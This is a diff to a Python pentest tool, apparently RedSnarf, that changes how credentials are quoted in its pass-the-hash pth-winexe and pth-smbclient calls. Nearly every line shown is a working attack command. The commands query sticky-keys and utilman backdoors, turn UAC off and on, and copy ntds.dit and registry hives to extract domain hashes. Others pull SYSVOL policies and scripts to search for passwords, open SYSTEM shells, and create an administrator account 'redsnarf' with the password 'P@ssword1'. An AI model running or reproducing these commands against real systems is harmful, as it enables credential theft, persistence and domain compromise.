 				print colored("[+]BACKDOOR 1: Sticky Keys Status",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"' 2>/dev/null")
 
 				print colored("[+]BACKDOOR 2: Utilman Status",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\"' 2>/dev/null")
 
 				sys.exit()	
 		
@@ -4689,8 +4689,8 @@ if edq_uac!='n':
 				print colored("\n[+]IMPORTANT - Leave UAC in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling UAC:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" /t REG_DWORD /f /D 1' 2>/dev/null")
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /f /D 1' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" /t REG_DWORD /f /D 1' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /f /D 1' 2>/dev/null")
 
 				sys.exit()	
 
@@ -4698,15 +4698,15 @@ if edq_uac!='n':
 				print colored("\n[+]IMPORTANT - Leave UAC in the state that you found it\n\n",'red')
 
 				print colored("[+]Disabling UAC:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" /t REG_DWORD /f /D 0' 2>/dev/null")
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /f /D 0' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" /t REG_DWORD /f /D 0' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /f /D 0' 2>/dev/null")
 
 				sys.exit()	
 	
 			elif edq_uac.upper()=='Q':
 				print colored("[+]Querying the status of UAC:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" ' 2>/dev/null")
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" ' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" ' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" ' 2>/dev/null")
 
 				sys.exit()
 
@@ -4910,12 +4910,12 @@ if ntds_util in yesanswers or ntds_util=="d":
 			fout.write('echo .\n')
 			fout.write(pscommand)
 			fout.close() 
-			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C c:\\ntds.bat\" 2>/dev/null")
-			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd redsnarf; recurse; prompt off; mget registry; exit' 2>/dev/null")
-			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit' 2>/dev/null")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C rd /s /q c:\\redsnarf\" 2>/dev/null")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\ntds.bat\" 2>/dev/null") 
+			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C c:\\ntds.bat\" 2>/dev/null")
+			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+targets[0]+"; cd redsnarf; recurse; prompt off; mget registry; exit' 2>/dev/null")
+			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+targets[0]+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit' 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C rd /s /q c:\\redsnarf\" 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\ntds.bat\" 2>/dev/null") 
 			if os.path.isfile(outputpath+targets[0]+'/registry/SYSTEM') and os.path.isfile(outputpath+targets[0]+'/Active Directory/ntds.dit'):	
 				print colored("[+]Found SYSTEM and ntds.dit",'green')
 				print colored("[+]Extracting Hash Database to "+outputpath+targets[0]+'/redsnarf ' +"be patient this may take a minute or two...",'yellow')
@@ -5000,9 +5000,9 @@ if policiesscripts_dump in yesanswers:
 				print colored("[+]Found directory for : "+outputpath+targets[0],'green')
 			if os.path.isdir(outputpath+targets[0]):
 				print colored("[+]Attempting to download policies folder from /sysvol",'green')		
-				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit' 2>/dev/null")
+				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit' 2>/dev/null")
 				print colored("[+]Attempting to download scripts folder from /sysvol",'green')	
-				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit' 2>/dev/null")
+				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit' 2>/dev/null")
 								
 				if os.path.isdir(outputpath+targets[0]+'/Policies/'):
 					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/Policies/','green')	
@@ -5087,7 +5087,7 @@ if system_tasklist in yesanswers:
 	if len(targets)==1:
 		try:
 			print colored ('\n[+] Getting NT AUTHORITY\SYSTEM Tasklist on '+targets[0]+'\n','yellow')
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd.exe /C TASKLIST /FI \"USERNAME ne NT AUTHORITY\SYSTEM\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd.exe /C TASKLIST /FI \"USERNAME ne NT AUTHORITY\SYSTEM\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			print proc.communicate()[0]			
 			sys.exit()
 		except:
@@ -5122,11 +5122,11 @@ if dropshell in yesanswers:
 				response = raw_input("\nWhat kind of shell would you like:? (q to quit) ")
 				if response.upper()=="S":	
 					print colored ('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
 					sys.exit()
 				elif response.upper()=="N" or response=="":
 					print colored ('\n[+] Dropping Shell on '+targets[0] +" with privileges of "+user+'\n','yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
 					sys.exit()
 				elif response.upper()=="W":
 					print colored ('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow')
@@ -5135,13 +5135,13 @@ if dropshell in yesanswers:
 				elif response.upper()=="A":
 					print colored ('\n[+] Dropping Shell on '+targets[0] +'\n','yellow')
 					print colored ("Adding a new account with the credentials username=",'green')+colored("redsnarf",'yellow')+colored(" password=",'green')+colored("P@ssword1",'yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe /c net user redsnarf P@ssword1 /ADD && net localgroup Administrators redsnarf /ADD\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" \"cmd.exe /c net user redsnarf P@ssword1 /ADD && net localgroup Administrators redsnarf /ADD\" 2>/dev/null")
 					print colored ("Dropping a shell with the account ",'green')+colored("redsnarf",'yellow')+colored(" and password ",'green')+colored("P@ssword1\n",'yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+"redsnarf"+"%"+"P@ssword1"+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+"redsnarf"+"%"+"P@ssword1"+"\' --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
 					sys.exit()
 				elif response.upper()=="SMB":
 					print colored ('\n[+] Connecting to C$ with SMBClient on '+targets[0] +'\n','yellow')
-					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' 2>/dev/null")
 					sys.exit()
 				elif response.upper()=="SMBC":
 					print colored ('\n[+] Select a share ' +'\n','yellow')
@@ -5162,7 +5162,7 @@ if dropshell in yesanswers:
 					
 					print colored("Mounting ",'yellow')+cshare+colored(" with SMBClient",'yellow')
 					
-					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/"+cshare+" -W "+domain_name+" -U "+user+"%"+passw+" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/"+cshare+" -W "+domain_name+" -U \'"+user+"%"+passw+"\' 2>/dev/null")
 					
 					sys.exit()
 				elif response.upper()=="SMBL":
@@ -5296,8 +5296,8 @@ if service_accounts !='n':
 	if service_accounts in yesanswers:
 		print colored("\n[+]Checking for services running as users: "+targets[0]+"\n",'yellow')
 		c
-		os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get users.txt\' 2>/dev/null")
-		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
+		os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+targets[0]+"; get users.txt\' 2>/dev/null")
+		os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
 		res = os.stat(outputpath+targets[0]+"/users.txt").st_size > 3
 		if res==True:
 			try:
@@ -5310,7 +5310,7 @@ if service_accounts !='n':
 						print colored("[+]Attempting to get account details "+n,'green')
 															
 						#First method net user account /domain to get account details may fail depending on what privs we have
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C net user "+n.split("\\")[1]+" /domain \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C net user "+n.split("\\")[1]+" /domain \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						stdout_value = proc.communicate()[0]
 						
 						#If it's succcessful print details to screen else try and get details via RPC enumeration
